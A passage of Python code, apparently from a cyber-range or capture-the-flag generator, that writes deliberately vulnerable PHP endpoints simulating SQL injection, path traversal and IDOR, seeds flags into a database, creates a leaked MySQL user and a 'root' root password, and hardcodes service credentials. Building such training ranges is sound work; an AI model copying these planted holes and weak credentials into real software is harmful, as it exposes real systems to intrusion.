        "web:/var/www/html/index.php": _default_index_php(company_name),
        "web:/var/www/html/login.php": _default_login_php(),
        "web:/var/www/config.php": _default_config_php(domain=domain),
    }

    if "sqli" in vuln_types:
        files["web:/var/www/html/search.php"] = _search_php(
            _flag_value_for_type(snapshot, "sqli")
        )

    if vuln_types.intersection({"path_traversal", "credential_reuse"}):
        files["web:/var/www/html/download.php"] = _download_php(
            path_flag=_flag_value_for_type(snapshot, "path_traversal"),
        )

    if "idor" in vuln_types:
        files["web:/var/www/html/api/index.php"] = _idor_api_php(
            _flag_value_for_type(snapshot, "idor"),
        )

    for flag in flags:
        if flag.path.startswith("db:"):
            files["db:sql"] = _append_sql(
                files.get("db:sql", ""),
                (
                    "USE flags;\n"
                    "INSERT INTO secrets(flag_name, flag) "
                    f"VALUES ('{flag.id}', '{flag.value}');\n"
                ),
            )
            if vuln_types.intersection({"weak_creds", "idor"}):
                files["db:sql"] = _append_sql(
                    files.get("db:sql", ""),
                    (
                        "CREATE USER IF NOT EXISTS 'leaked_user'@'%' "
                        "IDENTIFIED BY 'leaked_pass';\n"
                        "GRANT SELECT ON flags.* TO 'leaked_user'@'%';\n"
                        "GRANT SELECT ON referral_db.* TO 'leaked_user'@'%';\n"
                        "FLUSH PRIVILEGES;\n"
                    ),
                )
        elif "/" in flag.path:
            files[f"{flag.host}:{flag.path}"] = f"{flag.value}\n"

    for item in evidence_spec:
        if ":" not in item.location:
            continue
        files[item.location] = _append_text_payload(
            files.get(item.location, ""),
            item.pattern or f"evidence:{item.type}",
        )

    if "weak_creds" in vuln_types:
        files["db:/tmp/openrange-root-password.txt"] = "root\n"

    return files


def _flag_value_for_type(
    snapshot: SnapshotSpec,
    vuln_type: str,
) -> str:
    for vuln in snapshot.truth_graph.vulns:
        if vuln.type != vuln_type:
            continue
        for flag in snapshot.flags:
            if flag.host == vuln.host:
                return flag.value
    return snapshot.flags[0].value if snapshot.flags else "FLAG{placeholder}"


def _append_sql(existing: str, fragment: str) -> str:
    if not existing:
        return fragment
    return f"{existing.rstrip()}\n{fragment}"


def _predictable_user_password(
    username: str,
    *,
    seed: int | None,
    weak_creds_enabled: bool,
) -> str:
    if weak_creds_enabled and username in {"admin", "root"}:
        return "root"
    suffix = 2025 if seed is None else 2025 + (seed % 3)
    base = username.split("@", 1)[0] or "Welcome"
    return f"{base.capitalize()}!{suffix}"


def _append_text_payload(existing: str, fragment: str) -> str:
    line = fragment.rstrip("\n")
    if not existing:
        return f"{line}\n"
    return f"{existing.rstrip()}\n{line}\n"


def _default_index_php(company_name: str) -> str:
    return f"""<?php
echo "Welcome to the {company_name} referral portal";
?>"""


def _default_login_php() -> str:
    return """<?php
echo "Login";
?>"""


def _default_config_php(*, domain: str) -> str:
    ldap_dn = ",".join(f"dc={part}" for part in domain.split(".") if part) or "dc=corp,dc=local"
    return f"""<?php
$db_host = "db";
$db_name = "referral_db";
$db_user = "app_user";
$db_pass = "AppUs3r!2024";
$ldap_bind_dn = "cn=webapp,{ldap_dn}";
$ldap_bind_pw = "Svc!Ldap2024";
?>"""


def _search_php(flag_value: str) -> str:
    return f"""<?php
$q = $_GET["q"] ?? "";
if (stripos($q, "union") !== false || stripos($q, "flag") !== false) {{
    echo "{flag_value}";
}} else {{
    echo "product search results";
}}
?>"""


def _download_php(path_flag: str) -> str:
    flag = path_flag or "FLAG{placeholder}"
    return f"""<?php
$file = $_GET["file"] ?? "";
if ($file === "report.pdf") {{
    echo "PDF";
}} elseif (strpos($file, "config.php") !== false) {{
    readfile("/var/www/config.php");
}} elseif (strpos($file, "/etc/passwd") !== false) {{
    echo "root:x:0:0:root:/root:/bin/bash";
}} elseif (strpos($file, "flag1.txt") !== false) {{
    echo "{flag}";
}} else {{
    echo "missing";
}}
?>"""


def _idor_api_php(flag_value: str) -> str:
    return f"""<?php
$uri = $_SERVER["REQUEST_URI"] ?? "";
if (strpos($uri, "/api/users/1/profile") !== false) {{
    echo json_encode(["username" => "admin", "role" => "admin"]);
}} elseif (strpos($uri, "/api/users/2/profile") !== false) {{
    echo json_encode([
        "username" => "billing",
        "password" => "leaked_pass",
        "flag_hint" => "{flag_value}"
    ]);
}} else {{
    echo json_encode(["status" => "not_found"]);
}}
?>"""


# ---------------------------------------------------------------------------
# File-based builder (demos)
# ---------------------------------------------------------------------------


class FileBuilder:
    """Load a pre-built snapshot from a JSON file on disk.

    For demos and smoke tests where you want instant, known-good snapshots
    without any LLM calls.
    """

    def __init__(self, snapshot_dir: str = "snapshots") -> None:
        """Initialize with the directory containing snapshot JSON files."""
        self.snapshot_dir = Path(snapshot_dir)

    async def build(
        self,
        manifest: dict,
        context: BuildContext,
    ) -> SnapshotSpec:
        """Load a snapshot JSON file, optionally picking by seed."""
        if not self.snapshot_dir.exists():
            raise FileNotFoundError(
                f"Snapshot directory not found: {self.snapshot_dir}"
            )

        files = sorted(self.snapshot_dir.glob("**/spec.json"))
        if not files:
            # Fall back to any .json files
            files = sorted(self.snapshot_dir.glob("*.json"))
        if not files:
            raise FileNotFoundError(
                f"No snapshot JSON files found in {self.snapshot_dir}"
            )

        if context.seed is not None:
            chosen = files[context.seed % len(files)]
        else:
            chosen = files[0]

        logger.info("FileBuilder: loading snapshot from %s", chosen)
        raw = json.loads(chosen.read_text())
        return _parse_llm_response(json.dumps(raw))
